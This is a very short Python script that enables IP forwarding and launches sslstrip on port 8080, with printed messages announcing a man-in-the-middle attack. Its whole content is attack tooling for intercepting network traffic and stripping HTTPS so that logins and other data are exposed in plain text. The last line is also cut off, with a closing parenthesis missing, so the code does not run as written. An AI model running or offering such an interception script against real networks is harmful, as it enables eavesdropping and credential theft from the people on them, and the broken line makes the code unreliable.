import os

print("[INFO] Enabling IP forwarding...")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

print("[INFO] Running MITM attack with SSLStrip...")
os.system("sslstrip -l 8080"
